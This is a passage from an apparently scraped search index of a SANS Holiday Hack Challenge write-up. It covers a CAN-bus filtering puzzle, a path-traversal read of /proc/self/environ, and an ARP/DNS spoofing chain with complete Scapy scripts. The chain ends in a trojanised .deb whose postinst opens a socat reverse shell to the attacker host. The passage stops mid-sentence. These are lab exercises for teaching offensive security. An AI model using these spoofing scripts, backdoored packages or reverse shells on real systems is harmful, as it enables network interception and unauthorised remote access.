CAN-D-BUS Problem"},{"location":"objectives/objective7/#the-objective","text":"Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.","title":"The Objective"},{"location":"objectives/objective7/#chat-with-wunorse-openslae","text":"Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it.","title":"Chat with Wunorse Openslae"},{"location":"objectives/objective7/#hints-courtesy-wunorse-openslae","text":"The following hint is unlocked once we help Wunorse Openslae with the CAN bus terminal challenge.","title":"Hints Courtesy Wunorse Openslae"},{"location":"objectives/objective7/#can-id-codes","text":"Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors?","title":"CAN ID Codes"},{"location":"objectives/objective7/#solution","text":"Let us try to match each CAN-ID to a particular component.19B, 080, 018 etc are few ID's seen. We can take a screenshot to better see the ID's available. Now to create a table matching a CAN-ID to a component let us first add rules as shown below. These rules exclude all ID's so at this point no numbers should fly across our output pane. Now by selectively removing one rule at a time and trying out all the different components and noting any changes in the output pane we can find the mapping. The table below contains the mappings.188 CAN-ID doesn't seem to map to any component but this is fine. This could be an alive-check or heartbeat signal. CAN-ID component 244 Acceleration 080 Brake 019 Steering 02A start/stop 19B door(lock/unlock) 188 - The hints specifically mention brakes and door(lock/unlock) so let us focus on these components first.","title":"Solution"},{"location":"objectives/objective7/#whats-up-with-the-door","text":"Let's allow only only ID 19B(which corresponds to door) and block all others.We see that on pressing lock the output message is. 19B#000000000000 and on pressing unlock the output message is 19B#00000F000000. Apart from these two we see another message 19B#0000000F2057. message 19B#0000000F2057 appears spurious and we can add a rule to exclude it.","title":"What's up with the door?"},{"location":"objectives/objective7/#whats-up-with-the-brakes","text":"Let's allow only only ID 19B(which corresponds to door) and block all others. We see there are some spurious negative messages being sent.For example for brake value set to fifteen we see the message 080#0000000F which is expected but also see some messages of the form 0xFFFFFFF*. These are negative messages (two's complement form) but brake values range from 0-100. So let's add a rule to exclude these negative values as well.","title":"What's up with the brakes?"},{"location":"objectives/objective7/#rejoice","text":"We found both rules to exclude malicious messages and defrosted the sleigh! Answer This challenge doesn't require us to input an aswer. The objective is completed automatically when all malicious messages have been excluded.","title":"Rejoice"},{"location":"objectives/objective8/","text":"8) Broken Tag Generator difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Chat with Holly Evergreen After helping Holly Evergreen with the Redis Investigation challenge the following conversation ensues. Sorry to be a pest Santa, but could you look at the Tag Generator? I've been looking at it, and I wonder if the source code would provide more insight? I told Noel we should be more careful about disclosing information in error messages. I tried what you suggested and enumerating all endpoints really is good idea to understand an application's functionality. Hints Courtesy Holly Evergreen Source Code Retrieval We might be able to find the problem if we can get source code! Error Page Message Disclosure Can you figure out the path to the script? It's probably on error pages! Download File Mechanism Once you know the path to the file, we need a way to download it! Endpoint Exploration Is there an endpoint that will print arbitrary files? Content-Type Gotcha If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Source Code Analysis I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? Redirect to Download If you find a way to execute code blindly, I bet you can redirect to a file then download that file! Patience and Timing Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! Solution While exploring the upload file functionality of the tag generator website we see the following network requests. It seems that we can access the uploaded images from endpoint /image?id=<filename> What if we could also access system files using this endpoint? Let's try retrieving the /proc/self/environ file. This file stores the environment variables of the current running process. Note the path specified. We assume that the directory structure is something like this / \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 images \u2514\u2500\u2500 proc On submitting this request the browser displays the following error. The browser throws this error because it expects a jpeg file(since this is the value of the content-type header in the response). Let's try sumbitting the same request using cURL. This time we are able to see the response and the value of the environment variable as well. ;):~/kringle/objective8$curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output env.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 399 100 399 0 0 355 0 0:00:01 0:00:01 --:--:-- 355 ;):~/kringle/objective8$cat env.txt PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app;):~/kringle/objective8$ Rejoice We found the value of the environment variable GREETZ! Answer JackFrostWasHere","title":"8) Broken Tag Generator"},{"location":"objectives/objective8/#8-broken-tag-generator","text":"difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"8) Broken Tag Generator"},{"location":"objectives/objective8/#the-objective","text":"Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.","title":"The Objective"},{"location":"objectives/objective8/#chat-with-holly-evergreen","text":"After helping Holly Evergreen with the Redis Investigation challenge the following conversation ensues. Sorry to be a pest Santa, but could you look at the Tag Generator? I've been looking at it, and I wonder if the source code would provide more insight? I told Noel we should be more careful about disclosing information in error messages. I tried what you suggested and enumerating all endpoints really is good idea to understand an application's functionality.","title":"Chat with Holly Evergreen"},{"location":"objectives/objective8/#hints-courtesy-holly-evergreen","text":"","title":"Hints Courtesy Holly Evergreen"},{"location":"objectives/objective8/#source-code-retrieval","text":"We might be able to find the problem if we can get source code!","title":"Source Code Retrieval"},{"location":"objectives/objective8/#error-page-message-disclosure","text":"Can you figure out the path to the script? It's probably on error pages!","title":"Error Page Message Disclosure"},{"location":"objectives/objective8/#download-file-mechanism","text":"Once you know the path to the file, we need a way to download it!","title":"Download File Mechanism"},{"location":"objectives/objective8/#endpoint-exploration","text":"Is there an endpoint that will print arbitrary files?","title":"Endpoint Exploration"},{"location":"objectives/objective8/#content-type-gotcha","text":"If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!","title":"Content-Type Gotcha"},{"location":"objectives/objective8/#source-code-analysis","text":"I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?","title":"Source Code Analysis"},{"location":"objectives/objective8/#redirect-to-download","text":"If you find a way to execute code blindly, I bet you can redirect to a file then download that file!","title":"Redirect to Download"},{"location":"objectives/objective8/#patience-and-timing","text":"Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!","title":"Patience and Timing"},{"location":"objectives/objective8/#solution","text":"While exploring the upload file functionality of the tag generator website we see the following network requests. It seems that we can access the uploaded images from endpoint /image?id=<filename> What if we could also access system files using this endpoint? Let's try retrieving the /proc/self/environ file. This file stores the environment variables of the current running process. Note the path specified. We assume that the directory structure is something like this / \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 images \u2514\u2500\u2500 proc On submitting this request the browser displays the following error. The browser throws this error because it expects a jpeg file(since this is the value of the content-type header in the response). Let's try sumbitting the same request using cURL. This time we are able to see the response and the value of the environment variable as well. ;):~/kringle/objective8$curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output env.txt % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 399 100 399 0 0 355 0 0:00:01 0:00:01 --:--:-- 355 ;):~/kringle/objective8$cat env.txt PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app;):~/kringle/objective8$","title":"Solution"},{"location":"objectives/objective8/#rejoice","text":"We found the value of the environment variable GREETZ! Answer JackFrostWasHere","title":"Rejoice"},{"location":"objectives/objective9/","text":"9) ARP Shenanigans difficulty \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 The Objective Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document? Chat with Alabaster Snowball After helping Alabaster Snowball with the Scapy Practice challenge the following conversation ensues. Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa. Hints Courtesy Alabaster Snowball Sniffy Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. Spoofy The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts. Resolvy Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP. Embedy The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file Sniff let's sniff the eth0 interface using tcpdump. We see ARP traffic from host 10.6.6.35. The IP address of our host is 10.6.0.3 but perphaps we can pretend to be 10.6.6.53? guest@e41e2320b206:~$ tcpdump -nni eth0 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 17:17:20.208002 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:21.243912 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:21.827077 IP6 fe80::f045:66ff:fe35:fcee > ff02::2: ICMP6, router solicitation, length 16 17:17:22.275888 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:23.315873 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 17:17:24.347884 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28 ^C 6 packets captured 6 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ ifconfig eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST> mtu 1500 inet 10.6.0.3 netmask 255.255.0.0 broadcast 10.6.255.255 ether 02:42:0a:06:00:03 txqueuelen 0 (Ethernet) RX packets 61 bytes 2910 (2.9 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 We can carry out an ARP spoof attack with the help of /home/guest/scripts/arp_resp.py . guest@e41e2320b206:~/scripts$ cat arp_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"SOMEMACHERE\", type=0x806, src=\"SOMEMACHERE\") arp_response = ARP(pdst=\"SOMEMACHERE\") arp_response.op = 99999 arp_response.plen = 99999 arp_response.hwlen = 99999 arp_response.ptype = 99999 arp_response.hwtype = 99999 arp_response.hwsrc = \"SOMEVALUEHERE\" arp_response.psrc = \"SOMEVALUEHERE\" arp_response.hwdst = \"SOMEVALUEHERE\" arp_response.pdst = \"SOMEVALUEHERE\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main() Let's analyse the ARP packets sent by 10.6.6.35 using scapy and modify the script accordingly. guest@e41e2320b206:~$ tcpdump -nni eth0 -w sniff.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C3 packets captured 4 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ which scapy /usr/local/bin/scapy guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | Craft packets like I craft my beer. scccccp///pSP///p p//Y | -- Jean De Clerck sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/sniff.pcap\") >>> PACKETS.show() 0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0001 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0002 Ether / ARP who has 10.6.6.53 says 10.6.6.35 >>> PACKETS[0] <Ether dst=ff:ff:ff:ff:ff:ff src=4c:24:57:ab:ed:84 type=ARP |<ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 hwdst=00:00:00:00:00 :00 pdst=10.6.6.53 |>> the modifications are as follows The modified script is as follows #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 ip ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our eth0 mac address macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=\"4c:24:57:ab:ed:84\", type=0x806, src=macaddr) arp_response = ARP(pdst=\"10.6.6.35\") arp_response.op = 2 arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = \"IPv4\" arp_response.hwtype = 1 arp_response.hwsrc = macaddr arp_response.psrc = \"10.6.6.53\" arp_response.hwdst = \"4c:24:57:ab:ed:84\" arp_response.pdst = \"10.6.6.35\" response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=0) if __name__ == \"__main__\": main() Let's run our modified script and sniff packets on eth0 again to check if our ARP spoof worked. guest@e41e2320b206:~$ tcpdump -nni eth0 -w arp_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C9 packets captured 12 packets received by filter 0 packets dropped by kernel Opening up arp_spoof.pcap with scapy we see that our ARP spoof worked and we are getting DNS packets now. guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | Craft packets like it is your last scccccp///pSP///p p//Y | day on earth. sY/////////y caa S//P | -- Lao-Tze cayCyayP//Ya pY/Ya | sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/arp_spoof.pcap\") >>> PACKETS.show() 0000 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0001 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0002 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" 0003 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0004 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0005 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" 0006 Ether / ARP who has 10.6.6.53 says 10.6.6.35 0007 Ether / ARP is at 02:42:0a:06:00:03 says 10.6.6.53 0008 Ether / IP / UDP / DNS Qry \"b'ftp.osuosl.org.'\" >>> PACKETS[2] <Ether dst=02:42:0a:06:00:03 src=4c:24:57:ab:ed:84 type=IPv4 |<IP version=4 ihl=5 tos=0x0 len=60 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x5a4d src=10.6.6.35 dst=10.6.6.5 3 |<UDP sport=38919 dport=domain len=40 chksum=0xa256 |<DNS id=0 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNS QR qname='ftp.osuosl.org.' qtype=A qclass=IN |> an=None ns=None ar=None |>>>> Looks like the host is trying to resolve the domain ftp.osuosl.org. We can play the role of the resolver here by way of a DNS spoof attack and supply a DNS response containing a mapping of ftp.osuosl.org to any IP of our choice. We will choose to map ftp.osuos1.org to our own IP address 10.6.0.3 . We can carry out an ARP spoof attack with the help of the script /home/guest/scripts/dns_resp.py . guest@e41e2320b206:~/scripts$ cat dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=\"00:00:00:00:00:00\", dst=\"00:00:00:00:00:00\") # need to replace mac addresses ip = IP(dst=\"0.0.0.0\", src=\"0.0.0.0\") # need to replace IP addresses udp = UDP(dport=99999, sport=99999) # need to replace ports dns = DNS( # MISSING DNS RESPONSE LAYER VALUES ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main() We need to modify the script as follows The modified script is as follows guest@e41e2320b206:~/scripts$ cat our_dns_resp.py #!/usr/bin/python3 from scapy.all import * import netifaces as ni import uuid # Our eth0 IP ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] # Our Mac Addr macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=macaddr, dst=\"4c:24:57:ab:ed:84\") # need to replace mac addresses ip = IP(dst=\"10.6.6.35\", src=ipaddr_we_arp_spoofed) # need to replace IP addresses udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) # need to replace ports dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=\"10.6.0.3\")) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=0) if __name__ == \"__main__\": main() Now with our our_arp_resp.py script running, let's additionally run our_dns_resp.py as well. Let's sniff packets on eth0 interface to check if our DNS spoof worked. guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C84 packets captured 103 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | What is dead may never die! scccccp///pSP///p p//Y | -- Python 2 sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/dns_spoof.pcap\") guest@e41e2320b206:~$ tcpdump -nni eth0 -w dns_spoof.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C84 packets captured 103 packets received by filter 0 packets dropped by kernel guest@e41e2320b206:~$ /usr/local/bin/scapy INFO: Can't import matplotlib. Won't be able to plot. INFO: Can't import PyX. Won't be able to use psdump() or pdfdump(). INFO: No IPv6 support in kernel INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11) INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication. WARNING: IPython not available. Using standard Python shell instead. AutoCompletion, History are disabled. aSPY//YASa apyyyyCY//////////YCa | sY//////YSpcs scpCY//Pp | Welcome to Scapy ayp ayyyyyyySCP//Pp syY//C | Version 2.4.4 AYAsAYYYYYYYY///Ps cY//S | pCCCCY//p cSSps y//Y | https://github.com/secdev/scapy SPPPP///a pP///AC//Y | A//A cyP////C | Have fun! p///Ac sC///a | P////YCpc A//A | What is dead may never die! scccccp///pSP///p p//Y | -- Python 2 sY/////////y caa S//P | cayCyayP//Ya pY/Ya sY/PsY////YCc aC//Yp sc sccaCY//PCypaapyCP//YSs spCPY//////YPSps ccaacs >>> PACKETS = rdpcap(\"/home/guest/dns_spoof.pcap\") >>> PACKETS.show() 0063 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 S 0064 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 SA 0065 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0066 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0067 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 A 0068 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 PA / Raw 0069 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0070 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0071 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 PA / Raw 0072 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 PA / Raw 0073 Ether / IP / TCP 10.6.6.35:32800 > 10.6.0.3:http S 0074 Ether / IP / TCP 10.6.0.3:http > 10.6.6.35:32800 RA 0075 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 FPA / Raw 0076 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 A 0077 Ether / IP / TCP 10.6.0.3:47554 > 10.6.6.35:64352 FA 0078 Ether / IP / TCP 10.6.6.35:64352 > 10.6.0.3:47554 A Looks like our DNS Spoof worked! The below packet is particularly interesting. Looks like 10.6.6.35 is trying to send an HTTP request to port 80. 0073 Ether / IP / TCP 10.6.6.35:32800 > 10.6.0.3:http S Let' spoof an http server on port 80. We can do this by running the command python3 -m http.server 80 .Looks like the malware running on 10.6.6.35 is trying to fetch /pub/jfrost/backdoor/suriv_amd64.deb . guest@e41e2320b206:~$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.6.6.35 - - [10/Jan/2021 19:14:14] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:14] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - 10.6.6.35 - - [10/Jan/2021 19:14:15] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:15] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - 10.6.6.35 - - [10/Jan/2021 19:14:16] code 404, message File not found 10.6.6.35 - - [10/Jan/2021 19:14:16] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - Let's make this deb file available. However we will customise this deb file so that when the host installs it a reverse shell would be spawned and we can obtain command line access. We can choose any of the deb files available in /home/guest/debs to customise. guest@8238d08d5d09:~/debs$ ls gedit-common_3.36.1-1_all.deb nano_4.8-1ubuntu1_amd64.deb nmap_7.80+dfsg1-2build1_amd64.deb unzip_6.0-25ubuntu1_amd64.deb golang-github-huandu-xstrings-dev_1.2.1-1_all.deb netcat-traditional_1.10-41.1ubuntu1_amd64.deb socat_1.7.3.3-2_amd64.deb We get a clue on how to customise a deb file from hint 4. We need to extract the deb using command dpkg -x <file.deb> <directory> create a directory called DEBIAN in it which contains two files -control and postinst rebuild the deb using command dpkg-deb --build <directory> The postinst file will contain the commands to be executed. In our case we will include a command to spawn a Socat reverse shell. guest@f9ce1b9af4a1:~/debs$ dpkg -x nmap_7.80+dfsg1-2build1_amd64.deb work guest@f9ce1b9af4a1:~/debs$ mkdir -p work/DEBIAN guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/control guest@f9ce1b9af4a1:~/debs$ touch work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/control guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/control Package: nmap7 Version: 7.80+dfsg1-2 Architecture: any Maintainer: lel <packages@qa.debian.org> Description: must-install awesome tool guest@f9ce1b9af4a1:~/debs$ vi work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ cat work/DEBIAN/postinst RHOST=10.6.0.3 RPORT=4444 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/ dpkg-deb: error: maintainer script 'postinst' has bad permissions 664 (must be >=0555 and <=0775) guest@f9ce1b9af4a1:~/debs$ chmod 775 work/DEBIAN/postinst guest@f9ce1b9af4a1:~/debs$ dpkg-deb --build work/ dpkg-deb: building package 'nmap7' in 'work.deb'. Now let's set up a Socat listener to receive the shell. socat file:`tty`,raw,echo=0 tcp-listen:4444 Let's rename the deb file and serve it. Make sure the hierarchy of directories is correct. guest@f9ce1b9af4a1:~/debs$ mkdir -p ./pub/jfrost/backdoor/ guest@f9ce1b9af4a1:~/debs$ cp work.deb suriv_amd64.deb guest@f9ce1b9af4a1:~/debs$ cp suriv_amd64.deb ./pub/jfrost/backdoor/ guest@f9ce1b9af4a1:~/debs$ python3 -m http.server 80 We caught the reverse shell! guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444 /bin/sh: 0: can't access tty; job control turned off guest@f9ce1b9af4a1:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444 /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' bash: /root/.bashrc: Permission denied jfrost@e0b14eab16d0:/$ ls NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt etc lib64 opt sbin usr bin home libx32 proc srv var boot lib media root sys dev lib32 mnt run tmp On opening the file 